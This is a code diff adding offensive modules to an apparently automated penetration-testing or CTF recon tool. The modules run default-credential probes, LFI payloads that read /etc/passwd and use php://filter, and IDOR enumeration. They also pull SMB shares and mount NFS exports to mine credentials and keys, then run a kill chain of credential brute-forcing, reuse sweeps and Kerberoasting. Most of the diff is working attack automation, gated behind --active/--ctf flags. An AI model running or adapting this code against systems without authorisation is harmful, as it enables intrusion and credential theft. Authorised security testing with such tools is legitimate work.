+    """HTML intelligence (passive), plus default-cred / LFI / IDOR heuristics
+    (active-gated: probe when --active/--ctf, otherwise emit a ready-to-run command)."""
+    vulns = []
+    params = sorted(corpus.get('params', []))
+    _html_intel(url, port, outdir, loot)
+
+    # Default-cred probe on detected admin panels (product from whatweb output)
+    ww = outdir / f'whatweb_{port}.txt'
+    ww_text = ww.read_text().lower() if ww.exists() else ''
+    for sig, (path, creds) in _DEFAULT_CRED_PANELS.items():
+        if sig in ww_text or sig in url.lower():
+            if not active_enabled(args):
+                cred_str = ', '.join(f"{u}:{p or '<blank>'}" for u, p in creds)
+                _recommend(loot, f"hydra/curl default-creds on {url}{path} ({cred_str})",
+                           f"{sig} default credentials")
+                continue
+            for u, p in creds:
+                code, _o, _e = _run(['curl', '-sk', '-o', '/dev/null', '-w', '%{http_code}',
+                                    '-u', f'{u}:{p}', '--max-time', '8', url + path], timeout=10)
+                if _o.strip() in ('200', '302') and shutil.which('curl'):
+                    good(f"  default creds may work on {sig}: {u}:{p or '<blank>'}")
+                    if loot:
+                        loot.add_cred(u, p, source=f'default-cred:{sig}', scope='web', verified=False)
+                        loot.add_step(f"Web: try default creds {u}:{p or '<blank>'} on {sig}")
+                    vulns.append({'port': port, 'service': 'http', 'product': sig, 'version': '',
+                                 'desc': f'{sig} reachable with default-credential candidate {u}:{p or "<blank>"}',
+                                 'cve': '', 'exploit': f'login {url}{path} as {u}:{p}',
+                                 'severity': 'high'})
+            break
+
+    # LFI + IDOR heuristics over parameterized URLs
+    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
+    lfi_seen, idor_seen = False, False
+    for u in params:
+        pu = urlparse(u)
+        qs = parse_qsl(pu.query)
+        names = [k.lower() for k, _ in qs]
+        # IDOR: id-like param -> flag/recommend (safe: don't auto-abuse)
+        if not idor_seen and any(any(h == n or n.endswith(h) for h in _IDOR_PARAM_HINTS) for n in names):
+            idor_seen = True
+            _recommend(loot, f"for i in $(seq 1 50); do curl -s '{u}' | ...; done   # {u}",
+                       "IDOR: increment id-like parameter and diff responses")
+        # LFI: file-like param -> gated probe
+        if any(any(h in n for h in _LFI_PARAM_HINTS) for n in names):
+            if not active_enabled(args):
+                if not lfi_seen:
+                    lfi_seen = True
+                    _recommend(loot, f"ffuf/curl LFI: '{u}' with ../../../../etc/passwd & php://filter",
+                               "LFI on file-like parameter")
+                continue
+            for payload in ('../../../../../../etc/passwd',
+                            'php://filter/convert.base64-encode/resource=index'):
+                test_qs = urlencode([(k, payload if k.lower() in
+                                     [n for n in names if any(h in n for h in _LFI_PARAM_HINTS)]
+                                     else v) for k, v in qs])
+                test_url = urlunparse(pu._replace(query=test_qs))
+                _, body, _ = _run(['curl', '-sk', '--max-time', '8', test_url], timeout=10)
+                if re.search(r'root:.*:0:0:', body) or re.search(r'^[A-Za-z0-9+/]{80,}={0,2}$',
+                                                                 body.strip()[:200] or '', re.M):
+                    good(f"  LFI confirmed: {test_url}")
+                    if loot:
+                        loot.add('files', f'LFI: {test_url}')
+                        loot.add_step(f"Web: LFI at {pu.path} -> read /etc/passwd, harvest users")
+                    vulns.append({'port': port, 'service': 'http', 'product': 'web app', 'version': '',
+                                 'desc': f'Local File Inclusion at {pu.path}', 'cve': '',
+                                 'exploit': f'curl "{test_url}"', 'severity': 'high'})
+                    break
+    return vulns
+
+
+# ── Pull & mine SMB shares / NFS mounts (safe read-only enum; NFS mount gated) ──
+def run_share_mining(target, services, outdir, args, tools, loot=None):
+    """Download readable SMB shares (and, gated, NFS exports), then scan_output the
+    files for creds/keys/flags. Real loot lives inside shares, not in their listing."""
+    vulns = []
+    svc_names = {p: s.get('service', '').lower() for p, s in services.items()}
+    has_smb = any(('microsoft-ds' in n or 'netbios-ssn' in n or 'smb' in n)
+                  for n in svc_names.values()) or 445 in services or 139 in services
+    has_nfs = any('nfs' in n or 'rpcbind' in n for n in svc_names.values()) or 2049 in services
+
+    loot_dir = outdir / 'share_loot'
+    # SMB: read-only by default; in --bb hold unless --active (avoid surprise data pull)
+    smb_ok = has_smb and shutil.which('smbclient') and (not _low_intensity(args) or active_enabled(args))
+    if has_smb and not smb_ok:
+        _recommend(loot, f"smbmap -R -H {target} -u '' -p '' ; smbclient //{target}/<share> -N "
+                   f"-c 'recurse ON; prompt OFF; mget *'", "pull & grep readable SMB shares")
+    if smb_ok:
+        subsection("SMB Share Pull & Mine")
+        # discover readable non-admin shares from the null-session listing we already ran
+        null_file = outdir / 'nxc_smb_null.txt'
+        shares = set()
+        if null_file.exists():
+            for line in null_file.read_text().splitlines():
+                if 'READ' in line:
+                    m = re.search(r'\s(\S+)\s+READ', line)
+                    if m:
+                        shares.add(m.group(1))
+        if not shares:
+            _, out, _ = _run(['smbclient', '-N', '-L', f'//{target}/'], timeout=60)
+            shares.update(re.findall(r'^\s*(\S+)\s+Disk', out, re.M))
+        for sh in sorted(shares):
+            if sh.upper() in ('ADMIN$', 'C$', 'IPC$', 'PRINT$'):
+                continue
+            dest = loot_dir / sh
+            dest.mkdir(parents=True, exist_ok=True)
+            info(f"pulling //{target}/{sh}")
+            _run(['smbclient', f'//{target}/{sh}', '-N', '-c',
+                 f'recurse ON; prompt OFF; lcd {dest}; mget *'], timeout=180)
+            for f in dest.rglob('*'):
+                if f.is_file() and f.stat().st_size < 5_000_000:
+                    try:
+                        text = f.read_text(errors='ignore')
+                    except Exception:
+                        continue
+                    if loot:
+                        loot.add('files', f'share://{sh}/{f.relative_to(dest)}')
+                        loot.scan_output(text)
+            if loot:
+                loot.add_step(f"Loot: pulled SMB share {sh} -> mined for creds/keys")
+
+    # NFS: mounting needs root + writes a mountpoint -> gate under --active
+    if has_nfs and shutil.which('showmount'):
+        _, out, _ = _run(['showmount', '-e', target], timeout=30)
+        exports = re.findall(r'^(/\S+)', out, re.M)
+        for exp in exports:
+            if loot:
+                loot.add('shares', f'NFS export: {exp}')
+            if active_enabled(args) and shutil.which('mount') and os.geteuid() == 0:
+                mp = loot_dir / ('nfs_' + exp.strip('/').replace('/', '_'))
+                mp.mkdir(parents=True, exist_ok=True)
+                rc, _o, _e = _run(['mount', '-t', 'nfs', '-o', 'nolock',
+                                  f'{target}:{exp}', str(mp)], timeout=30)
+                if rc == 0:
+                    good(f"  mounted {exp}")
+                    for f in mp.rglob('*'):
+                        if f.is_file() and f.stat().st_size < 5_000_000:
+                            try:
+                                loot.scan_output(f.read_text(errors='ignore')) if loot else None
+                            except Exception:
+                                pass
+                    _run(['umount', str(mp)], timeout=30)
+                    if loot:
+                        loot.add_step(f"Loot: mounted NFS {exp} -> mined for creds/keys")
+            else:
+                _recommend(loot, f"sudo mount -t nfs -o nolock {target}:{exp} /mnt/x && grep -r -Ei "
+                           "'pass|id_rsa|\\.kdbx|flag' /mnt/x", "mount & mine NFS export")
+    return vulns
+
+
 def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None, hostnames=None):
     """Phase 5: Supplementary Tool Enumeration (vhosts, web, SMB, NFS, FTP, TLS, nuclei).
     Returns list of additional structured vuln findings discovered in phase 5."""
@@ -2640,6 +3441,8 @@ def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None,
 
     hostnames = hostnames or []
     shellshock_vulns = []
+    web_corpus = {'urls': set(), 'params': set()}   # crawler output, feeds injection/SSRF
+    p5_context = {}                                  # shared AD state (domain/users/creds)
 
     # Searchsploit deep scan (re-run on any new services discovered in phase 3/4)
     if tools.get('searchsploit'):
@@ -2888,6 +3691,31 @@ def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None,
                             print(f"    {line}")
             except Exception:
                 pass
+
+        # Crawl this web service into the shared URL / parameter corpus
+        pc = build_web_corpus(url, port, target, outdir, args, tools, loot)
+        web_corpus['urls'].update(pc['urls'])
+        web_corpus['params'].update(pc['params'])
+        # Web foothold heuristics: HTML-intel (passive) + default-cred/LFI/IDOR (gated)
+        shellshock_vulns += run_web_foothold_suite(url, port, pc, outdir, args, tools, loot)
+
+    # ── Injection & SSRF testing (consume crawler corpus; active-gated) ──
+    if web_corpus['params']:
+        shellshock_vulns += run_injection_suite(web_corpus['params'], outdir, args, tools, loot)
+        shellshock_vulns += run_ssrf_suite(web_corpus['params'], outdir, args, tools, loot)
+
+    # ── Passive subdomain discovery (hostname targets only) ──
+    _sub_host = args.hostname or target
+    if tools.get('subfinder') and http_ports and not _is_ip(_sub_host):
+        subsection("Subdomain Discovery (subfinder)")
+        _, _sf_out, _ = _run(['subfinder', '-silent', '-d', _sub_host], timeout=180)
+        subs = sorted({l.strip() for l in _sf_out.splitlines() if l.strip()})
+        if subs:
+            (outdir / 'subfinder.txt').write_text('\n'.join(subs))
+            good(f"subfinder: {len(subs)} subdomains")
+            if loot:
+                for s in subs[:50]:
+                    loot.add('notes', f'subdomain: {s}')
 
     # ── VHost / Subdomain enumeration ──
     if args.vhosts and http_ports:
@@ -3219,6 +4047,25 @@ def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None,
                         loot.scan_output(r.stdout)
             except Exception:
                 pass
+
+    # ── Kill-chain sequence: unauth AD enum → cred brute → reuse sweep → authed AD ──
+    # Each stage feeds the next through loot.valid_creds / p5_context (the feedback loop).
+    _ad_domain = getattr(args, 'domain', None) or domain_name or ''
+    # 1. Unauthenticated enum: null/RID users → ad_users.txt, domain, user==pass spray
+    shellshock_vulns += run_ad_enum_unauth(target, services, outdir, args, tools, loot,
+                                           domain=_ad_domain, context=p5_context)
+    # 1b. Pull & mine readable SMB shares / NFS exports (loot lives inside them)
+    shellshock_vulns += run_share_mining(target, services, outdir, args, tools, loot)
+    # 2. Credential brute against auth services (consumes ad_users.txt)
+    shellshock_vulns += run_credential_attacks(target, services, outdir, args, tools, loot,
+                                               context=p5_context)
+    # 3. Credential reuse sweep: try every found cred against every other service
+    shellshock_vulns += run_credential_reuse(target, services, outdir, args, tools, loot,
+                                             context=p5_context)
+    # 4. Credentialed AD collection (Kerberoast/BloodHound) using any validated cred
+    shellshock_vulns += run_ad_collect_authed(target, services, outdir, args, tools, loot,
+                                              domain=(p5_context.get('domain') or _ad_domain),
+                                              context=p5_context)
 
     # AI tool strategy advice
     if api_key:
@@ -3560,6 +4407,35 @@ Provide:
         good(f"JSON export: {json_file}")
 
 
+def _chain_enablers(loot, vulns, services):
+    """Surface findings/loot that unlock the next step (foothold value > raw CVSS).
+    This is the chain-aware prioritization the walkthrough corpus reasons with."""
+    out = []
+    for c in getattr(loot, 'valid_creds', [])[:10]:
+        secret = c.get('pw') or c.get('nthash') or ''
+        out.append(f"Valid credential `{c['user']}:{secret}` "
+                   f"(scope: {c.get('scope', '?')}, via {c.get('source', '?')})")
+    for s in getattr(loot, 'shares', [])[:10]:
+        if 'READ' in s or 'NFS export' in s:
+            out.append(f"Readable share/export: `{s}`")
+    unames = set(getattr(loot, 'usernames', []))
+    if unames:
+        out.append(f"{len(unames)} usernames harvested → seed brute/spray lists")
+    for k in getattr(loot, 'keys', [])[:10]:
+        out.append(f"Key/hash to crack: `{k}`")
+    for v in vulns:
+        d = v.get('desc', '').lower()
+        if any(x in d for x in ('anonymous', 'default-credential', 'local file inclusion',
+                                'credential reuse', 'user==pass', 'kerberoast', 'signing not required')):
+            out.append(f"[{v.get('severity', '').upper()}] {v['desc']}")
+    seen, uniq = set(), []
+    for x in out:
+        if x not in seen:
+            seen.add(x)
+            uniq.append(x)
+    return uniq[:20]
+
+
 def write_markdown_report(target, services, vulns, all_scripts, sploit_results,
                           os_info, hostnames, suggestions, ai_response, loot, outdir):
     """Write a detailed Markdown report."""
@@ -3589,6 +4465,25 @@ def write_markdown_report(target, services, vulns, all_scripts, sploit_results,
         lines.append(f"- **OS:** {os_info[0].get('name', 'Unknown')} ({os_info[0].get('accuracy', '?')}%)")
     if hostnames:
         lines.append(f"- **Hostnames:** " + ', '.join(f"`{h}`" for h in hostnames[:10]))
+
+    # Kill-chain narrative: chain-enablers first, then the ordered path stitched from loot
+    if loot:
+        enablers = _chain_enablers(loot, vulns, services)
+        chain = getattr(loot, 'chain', [])
+        if enablers or chain:
+            lines.extend(['', '## Kill-Chain Narrative', ''])
+            if enablers:
+                lines.append('**Chain enablers — start here (what unlocks the next step, ranked above raw CVSS):**')
+                lines.append('')
+                for e in enablers:
+                    lines.append(f"- {e}")
+                lines.append('')
+            if chain:
+                lines.append('**Path walked / available:**')
+                lines.append('')
+                for i, step in enumerate(chain, 1):
+                    lines.append(f"{i}. {step}")
+                lines.append('')
 
     lines.extend(['', '## Services', ''])
     lines.append("| Port | Proto | Service | Product | Version | Extras |")
@@ -3635,7 +4530,7 @@ def write_markdown_report(target, services, vulns, all_scripts, sploit_results,
 
     # Loot
     if loot:
-        loot_categories = ['creds', 'keys', 'flags', 'shares', 'urls', 'files', 'notes']
+        loot_categories = ['creds', 'usernames', 'keys', 'flags', 'shares', 'urls', 'files', 'notes', 'recommend']
         has_loot = any(getattr(loot, cat, []) for cat in loot_categories)
         if has_loot:
             lines.extend(['', '## Loot', ''])
@@ -3912,6 +4807,20 @@ Setup:
     web.add_argument('--vhost-wordlist', help='Wordlist for vhost/subdomain brute (ffuf)')
     web.add_argument('--update-hosts', action='store_true',
                      help='Append discovered hostnames to /etc/hosts (requires root)')
+
+    offense = p.add_argument_group('Offensive / Active (safe-by-default; gated)')
+    offense.add_argument('--active', action='store_true',
+                         help='Enable active/intrusive tools: sqlmap, dalfox, commix, ssrfmap, '
+                              'hydra/kerbrute/netexec brute (also on in --ctf). Off by default.')
+    offense.add_argument('--no-crawl', action='store_true',
+                         help='Skip web crawling (katana/gau/waybackurls/arjun) and the URL/param corpus')
+    offense.add_argument('--oob', action='store_true',
+                         help='Use interactsh OOB canary for blind SSRF/RCE (needs interactsh-client)')
+    offense.add_argument('--creds', metavar='USER:PASS', default='',
+                         help='Credentials for authenticated AD collection (Kerberoast, BloodHound)')
+    offense.add_argument('--userlist', help='Username wordlist for brute/spray (hydra, kerbrute, netexec)')
+    offense.add_argument('--passlist', help='Password wordlist for brute/spray')
+    offense.add_argument('--domain', help='AD/Kerberos domain (auto-detected from LDAP if omitted)')
 
     output = p.add_argument_group('Output')
     output.add_argument('-o', '--output', help='Output directory')
